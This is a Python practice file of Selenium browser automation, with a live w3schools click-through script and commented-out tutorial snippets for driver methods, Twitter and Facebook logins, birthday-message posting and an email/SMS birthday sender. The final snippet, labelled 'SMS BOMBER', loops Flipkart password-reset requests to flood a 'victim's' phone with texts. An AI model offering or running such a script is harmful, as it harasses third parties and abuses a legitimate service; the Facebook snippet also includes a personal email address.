from selenium import webdriver
from webdriver_manager.microsoft import EdgeChromiumDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
import time
# import Action chains  
from selenium.webdriver.common.action_chains import ActionChains 

driver = webdriver.Edge()
driver.get("https://www.w3schools.com/")
#element = driver.find_element(By.CLASS_NAME, "tnb-nav-btn w3-bar-item w3-button barex bar-item-hover w3-padding-16 ga-top ga-top-services")

#Using XPATH to find the Javascript button on w3schools website and performing click action
element = driver.find_element(By.XPATH,"/html/body/div[3]/a[3]")
element.click()
time.sleep(8)

# Using ID to find the Services button and performing click action
element = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.ID, "navbtn_services")))
element.click()
time.sleep(5)
driver.back()
time.sleep(10)

#Using css selector clicking the link "Not sure where to begin?"
element1 = driver.find_element(By.CSS_SELECTOR,"#main > div.ws-black.w3-center.herosection > div > h4 > a")
WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.CSS_SELECTOR,"#main > div.ws-black.w3-center.herosection > div > h4 > a")))
element1.click()
time.sleep(5)
driver.back()
time.sleep(8)

# Using LINK_TEXT to find the Sign Up button and performing click action
element2 = driver.find_element(By.LINK_TEXT, "Sign Up")
WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.LINK_TEXT,"Sign Up")))
element2.click()
driver.back()
time.sleep(10)

#interact with an input field
action = ActionChains(driver) 
element3 = driver.find_element(By.TAG_NAME,"input")
action.double_click(on_element = element3).send_keys("ABCD").perform()
time.sleep(10)

driver.execute_script("window.open('https://openai.com/chatgpt/')")
driver.switch_to.window(driver.window_handles[1])
print("Current URL:",driver.current_url)

driver.close()
driver.switch_to.window(driver.window_handles[0])

"""#Action Chains
# create action chain object 
action = ActionChains(driver) 
  
# click the item 
action.click(on_element = element) 
  
# perform the operation 
action.perform()

# click and hold  the item 
action.click_and_hold(on_element = element) 
  
# perform the operation 
action.perform()

# context click the item 
action.context_click(on_element = element)

# double click the item 
action.double_click(on_element = element)

# drag and drop the item 
action.drag_and_drop(source_element, target_element) 

# perform the operation
action.key_down(Keys.CONTROL).send_keys('F').key_up(Keys.CONTROL).perform()

# perform the operation
action.key_down(Keys.CONTROL).send_keys('F').key_up(Keys.CONTROL).perform()

# move the cursor 
action.move_by_offset(200, 200)

# perform the operation 
action.move_to_element(element).click().perform()

# perform the operation 
action.move_to_element_with_offset(element, 100, 200).click().perform()

# release the item 
action.release(on_element = element)

# click the item 
action.click(on_element = element) 
  
# perform the operation 
action.perform() 
  
# get another element  
another_element = driver.find_element_by_link_text("Courses") 
  
# reset the action 
action.reset_actions() 
  
# click the item 
action.click(on_element = another_element) 
  
# perform the operation 
action.perform()

# click the item 
action.click(on_element = element) 
  
# send keys 
action.send_keys("Arrays")

# add_cookie method driver 
driver.add_cookie({"name" : "foo", "value" : "bar"})

# get geeksforgeeks.org
driver.get("https://www.geeksforgeeks.org/")
 
# get geeksforgeeks.org
driver.get("https://www.practice.geeksforgeeks.org/")
 
# one step back in browser history
driver.back()

# get geeksforgeeks.org 
driver.get("https://www.geeksforgeeks.org/") 
  
# close current window 
driver.close()

# get element  
element = driver.find_element_by_link_text("Courses") 
  
# get id of element 
id = element._id 
  
# create another element 
element_clone = driver.create_web_element(id)

# clear all cookies in scope of session 
driver.delete_all_cookies()

 
# add_cookie method driver
driver.add_cookie({"name" : "foo", "value" : "bar"})
 
# delete browser cookie
driver.delete_cookie("foo")

# write script 
script = "alert('Alert via selenium')"
  
# generate a alert via javascript 
driver.execute_async_script(script)

# write script 
script = "alert('Alert via selenium')"
  
# generate a alert via javascript 
driver.execute_script(script)

# get geeksforgeeks.org
driver.get("https://www.practice.geeksforgeeks.org/")
 
# one step forward in browser history
driver.forward()

 
# get geeksforgeeks.org
driver.get("https://www.practice.geeksforgeeks.org/")
 
# full screen window
driver.fullscreen_window()


# get all cookies in scope of session
print(driver.get_cookies())

# get browser log
driver.get_log("browser")

# get Screenshot 
print(driver.get_screenshot_as_base64())

# get Screenshot 
print(driver.get_screenshot_as_file("foo.png"))

# get Screenshot 
print(driver.get_screenshot_as_png())

# get window position 
print(driver.get_window_position(windowHandle ='current'))

# get window position 
print(driver.get_window_rect())

# get window size
print(driver.get_window_size())

 
# set wait time 
driver.implicitly_wait(30)

# maximize window position 
driver.maximize_window()

# minimize window position 
driver.minimize_window()

# quit window position 
driver.quit()

# refresh window  
driver.refresh()

# sets timeout to 30
driver.set_page_load_timeout(30)

# sets timeout to 30 
driver.set_script_timeout(30)

# set window position
driver.set_window_position(1024, 1024, windowHandle ='current')

# set window position
driver.set_window_rect(x = 100, y = 200, width = 1024, height = 700)

# get current url 
print(driver.current_url)

# get current_window_handle 
print(driver.current_window_handle)

# get page_source
print(driver.page_source)

# get title 
print(driver.title)

# get element 
element = driver.find_element_by_link_text("Courses")
 
# print value
print(element.is_displayed())

  
# get element  
element = driver.find_element_by_link_text("Courses") 
  
# get text_length property 
print(element.get_property('href'))

# get element 
element = driver.find_element_by_id(&quot;gsc-i-id2&quot;)

# send keys 
element.send_keys(&quot;Arrays&quot;)

# get element  
element = driver.find_element_by_id("gsc-i-id2") 
  
# send keys  
element.send_keys("Arrays") 
  
# clear contents 
element.clear()

# get element  
element = driver.find_element_by_id("gsc-i-id2") 
  
# send keys  
element.send_keys("Arrays") 
  
# submit contents 
element.submit()

# get element 
element = driver.find_element_by_id("gsc-i-id2")
 
# get location
element.location

# get element  
element = driver.find_element_by_id("gsc-i-id2") 
  
# get parent 
print(element.parent)

# get element  
element = driver.find_element_by_id("gsc-i-id2") 
  
# get tag_name 
print(element.tag_name)

# get element  
element = driver.find_element_by_id("gsc-i-id2") 
  
# get rect 
print(element.rect)
"""

"""
Browser Automation using python
from selenium import webdriver	 

# For using sleep function because selenium 
# works only when the all the elements of the 
# page is loaded.
import time 

from selenium.webdriver.common.keys import Keys 
from selenium.webdriver.common.by import By

# Creating an instance webdriver
browser = webdriver.Firefox() 
browser.get('https://www.twitter.com')

# Let's the user see and also load the element 
time.sleep(2)

login = browser.find_elements(By.XPATH, '//*[@id="doc"]/div[1]/div/div[1]/div[2]/a[3]')

# using the click function which is similar to a click in the mouse.
login[0].click()

print("Login in Twitter")

user = browser.find_elements(By.XPATH, '//*[@id="login-dialog-dialog"]/div[2]/div[2]/div[2]/form/div[1]/input')

# Enter User Name
user[0].send_keys('USER-NAME')

user = browser.find_element(By.XPATH, '//*[@id="login-dialog-dialog"]/div[2]/div[2]/div[2]/form/div[2]/input')

# Reads password from a text file because
# saving the password in a script is just silly.
with open('test.txt', 'r') as myfile: 
	Password = myfile.read().replace('\n', '')
user.send_keys(Password)

LOG = browser.find_elements(By.XPATH, '//*[@id="login-dialog-dialog"]/div[2]/div[2]/div[2]/form/input[1]')
LOG[0].click()
print("Login Successful")
time.sleep(5)

elem = browser.find_element(By.XPATH, "q")
elem.click()
elem.clear()

elem.send_keys("Geeks for geeks ")

# using keys to send special KEYS 
elem.send_keys(Keys.RETURN) 

print("Search Successful")

# closing the browser
browser.close() 
"""

"""
Facebook Login using selenium
from selenium import webdriver
from time import sleep
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options 
from selenium.webdriver.common.by import By

usr=input('Enter Email Id:') 
pwd=input('Enter Password:') 

driver = webdriver.Chrome(ChromeDriverManager().install())
driver.get('https://www.facebook.com/')
print ("Opened facebook")
sleep(1)

username_box = driver.find_element(By.ID, 'email')
username_box.send_keys(usr)
print ("Email Id entered")
sleep(1)

password_box = driver.find_element(By.ID, 'pass')
password_box.send_keys(pwd)
print ("Password entered")

login_box = driver.find_element(By.ID, 'loginbutton')
login_box.click()

print ("Done")
input('Press anything to quit')
driver.quit()
print("Finished")
"""
"""
Happy birthday automation
# importing necessary classes
# from different modules
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.keys import Keys
import time

chrome_options = webdriver.ChromeOptions()

prefs = {"profile.default_content_setting_values.notifications": 2}
chrome_options.add_experimental_option("prefs", prefs)
browser = webdriver.Chrome("chromedriver.exe")

# open facebook.com using get() method
browser.get('https://www.facebook.com/')

# user_name or e-mail id
username = "agrawal.abhi108@gmail.com"

# getting password from text file
with open('test.txt', 'r') as myfile:
	password = myfile.read().replace('\n', '')

print("Let's Begin")

element = browser.find_elements_by_xpath('//*[@id ="email"]')
element[0].send_keys(username)

print("Username Entered")

element = browser.find_element_by_xpath('//*[@id ="pass"]')
element.send_keys(password)

print("Password Entered")

# logging in
log_in = browser.find_elements_by_id('loginbutton')
log_in[0].click()

print("Login Successful")

browser.get('https://www.facebook.com/events/birthdays/')

feed = 'Happy Birthday !'

element = browser.find_elements_by_xpath("//*[@class ='enter_submit\
	uiTextareaNoResize uiTextareaAutogrow uiStreamInlineTextarea\
				inlineReplyTextArea mentionsTextarea textInput']")

cnt = 0

for el in element:
	cnt += 1
	element_id = str(el.get_attribute('id'))
	XPATH = '//*[@id ="' + element_id + '"]'
	post_field = browser.find_element_by_xpath(XPATH)
	post_field.send_keys(feed)
	post_field.send_keys(Keys.RETURN)
	print("Birthday Wish posted for friend" + str(cnt))

# Close the browser
browser.close()
"""
"""Automated gmail
# import required packages
import pandas as pd
import datetime
import smtplib
import time
import requests
from win10toast import ToastNotifier

# your gmail credentials here
GMAIL_ID = 'your_email_here'
GMAIL_PWD = 'your_password_here'

# for desktop notification
toast = ToastNotifier()

# define a function for sending email
def sendEmail(to, sub, msg):

	# connection to gmail
	gmail_obj = smtplib.SMTP('smtp.gmail.com', 587) 
	
	# starting the session
	gmail_obj.starttls()	 
	
	# login using credentials
	gmail_obj.login(GMAIL_ID, GMAIL_PWD) 
	
	# sending email
	gmail_obj.sendmail(GMAIL_ID, to, 
				f"Subject : {sub}\n\n{msg}") 
	
	# quit the session
	gmail_obj.quit() 
	
	print("Email sent to " + str(to) + " with subject "
		+ str(sub) + " and message :" + str(msg))
	
	toast.show_toast("Email Sent!" , 
					f"{name} was sent e-mail",
					threaded = True, 
					icon_path = None,
					duration = 6)

	while toast.notification_active():
		time.sleep(0.1)

# define a function for sending sms	 
def sendsms(to, msg, name, sub):

	url = "https://www.fast2sms.com/dev/bulk"
	payload = f"sender_id=FSTSMS&message={msg}&language=english&route=p&numbers={to}"
	
	headers = {
		'authorization': "API_KEY_HERE",
		'Content-Type': "application/x-www-form-urlencoded",
		'Cache-Control': "no-cache",
		}

	response_obj = requests.request("POST", url,
								data = payload,
								headers = headers)
	print(response_obj.text)
	print("SMS sent to " + str(to) + " with subject :" +
		str(sub) + " and message :" + str(msg))
	
	toast.show_toast("SMS Sent!" ,
					f"{name} was sent message", 
					threaded = True, 
					icon_path = None,
					duration = 6)

	while toast.notification_active():
		time.sleep(0.1)

# driver code
if __name__=="__main__":

	# read the excel sheet having all the details
	dataframe = pd.read_excel("excelsheet.xlsx") 
	
	# today date in format : DD-MM
	today = datetime.datetime.now().strftime("%d-%m") 
	
	# current year in format : YY
	yearNow = datetime.datetime.now().strftime("%Y")
	
	# writeindex list
	writeInd = []												 

	for index,item in dataframe.iterrows():
	
		msg = "Many Many Happy Returns of the day dear " + str(item['NAME']) 
				
		# stripping the birthday in excel 
		# sheet as : DD-MM
		bday = item['Birthday'].strftime("%d-%m")	 
		
		# condition checking
		if (today == bday) and yearNow not in str(item['Year']): 
			
			# calling the sendEmail function
			sendEmail(item['Email'], "Happy Birthday",
					msg) 
			
			# calling the sendsms function
			sendsms(item['Contact'], msg, item['NAME'],
					"Happy Birthday") 
			
			writeInd.append(index)								 

	for i in writeInd:
	
		yr = dataframe.loc[i,'Year']
		
		# this will record the years in which
		# email has been sent
		dataframe.loc[i,'Year'] = str(yr) + ',' + str(yearNow)			 

	dataframe.to_excel('excelsheet.xlsx', 
				index = False)
"""

"""
SMS BOMBER

from selenium import webdriver
import time

# create instance of Chrome webdriver
browser = webdriver.Chrome()

# set the frequency of sms which is approx maximum to 10 per 24 days
frequency = 10

# target mobile number, change it to victim's number and
# also ensure that it's registered on flipkart
mobile_number ="1234567890"

for i in range(frequency):
	browser.get('https://www.flipkart.com/account/login?ret=/')

	# find the element where we have to 
	# enter the number using the class name
	number = browser.find_element_by_xpath('//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input')

	# automatically type the target number
	number.send_keys("1234567890")
	
	# find the element to send a forgot password
	# request using it's class name
	forgot = browser.find_element_by_link_text('Forgot?')
	
	# clicking on that element
	forgot.click()
	
	# set the interval to send each sms
	time.sleep(2)
	
# Close the browser
browser.quit()
"""
